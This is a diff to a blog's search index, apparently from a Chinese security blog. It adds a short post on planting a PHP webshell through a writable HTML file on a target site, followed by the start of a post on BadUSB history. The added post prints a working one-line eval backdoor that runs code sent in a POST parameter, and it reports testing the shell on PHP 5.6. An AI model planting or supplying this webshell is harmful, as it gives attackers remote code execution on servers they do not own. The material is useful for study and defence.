@@ -1,6 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>JsWebshell</title>
+    <url>/2019/12/11/JSshell/</url>
+    <content><![CDATA[<p>在目标站有可写的html点时可以使用</p>
+<a id="more"></a>
+
+<h3 id="0x00-准备环境"><a href="#0x00-准备环境" class="headerlink" title="0x00 准备环境"></a>0x00 准备环境</h3><p>环境使用的是：PHP Version 5.6.27+Apach</p>
+<h3 id="0x01-开始实验"><a href="#0x01-开始实验" class="headerlink" title="0x01 开始实验"></a>0x01 开始实验</h3><p>准备的代码为（这里用的虽然是js其实最后还是用了php）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@eval($_POST[&apos;web&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这里我们先用纯Html做一次测试</p>
+<p><img src=".%5Cimages%5CJSshell%5Chtml.png" alt="html"></p>
+<p>我们访问html页面发现并没有任何反应</p>
+<p><img src=".%5Cimages%5CJSshell%5Chtmlphpinfo.png" alt="html"></p>
+<p>我们再次访问php页面查看结果发现phpinfo出现在了页面上</p>
+<p><img src=".%5Cimages%5CJSshell%5Cphpphpinfo.png" alt="html"></p>
+<p>这里再测试一下可以利用的版本发现7以上的版本都不能顺利执行</p>
+<p><img src=".%5Cimages%5CJSshell%5C7.0.png" alt="html"></p>
+<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>利用条件已经很明确了，必须要php下确实存在的才可以被利用，这个方法可用完全是因为php支持html的原因，php7移除该方法，其实利用条件还是比较苛刻的。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>BadUsb</title>
     <url>/2019/04/19/BadUsb/</url>
     <content><![CDATA[<p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
